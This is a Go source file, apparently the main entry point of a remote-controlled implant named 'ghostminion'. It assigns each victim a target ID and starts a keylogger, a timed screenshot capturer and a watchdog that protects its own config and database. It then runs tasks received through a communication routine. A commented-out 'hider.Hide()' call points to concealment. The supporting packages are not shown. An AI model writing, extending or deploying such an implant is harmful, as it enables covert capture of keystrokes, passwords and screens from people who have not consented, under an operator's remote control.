package main

import (
	"fmt"
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/persistence"
	"log"
)

func main() {

	configInstance, err := config.LoadConfig("../config.yaml")
	if err != nil {
		panic(err)
	}

	//err = hider.Hide()
	//if err != nil {
	//	panic(err)
	//}

	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
	if err != nil {
		panic(err)
	}

	targetId := persistence.GenerateTargetID()
	fmt.Println("targetId:", targetId)

	appManager := apps.GetAppManagerInstance()
	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
	appManager.StartApp(string(apps.ScreenShotTask)+"_default", &apps.ScreenshotApp{
		Interval: int8(configInstance.Apps.Screenshot["Interval"].(int)),
	})
	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
		FilesExistence: []string{
			configInstance.Installation.ConfigFile,
			configInstance.Installation.DBPath,
		},
	})
	appManager.StartAll()

	taskCh := make(chan apps.AppData)
	go communication.Routine(taskCh)
	for task := range taskCh {
		if app, err := apps.NewAppFactory(task); err != nil {
			log.Print(err)
		} else {
			appManager.StartApp(task.Name, app)
		}
	}

	appManager.StopAll()
}
